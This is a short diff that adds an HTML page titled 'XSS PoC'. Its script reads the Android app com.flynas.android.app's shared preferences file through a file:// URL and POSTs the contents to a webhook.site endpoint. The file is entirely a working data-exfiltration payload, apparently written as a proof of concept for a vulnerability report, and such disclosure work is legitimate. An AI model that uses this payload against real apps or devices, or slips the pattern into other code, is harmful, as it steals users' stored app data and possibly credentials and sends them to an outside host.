@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS PoC</title></head>
+<body>
+<script>
+fetch('file:///data/data/com.flynas.android.app/shared_prefs/com.flynas.android.app_preferences.xml')
+  .then(r => r.text())
+  .then(d => {
+    fetch('https://webhook.site/6c7afdd6-07bd-4209-8e3f-52d53ab8e97a', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: d
+    });
+  });
+</script>
+</body>
+</html>
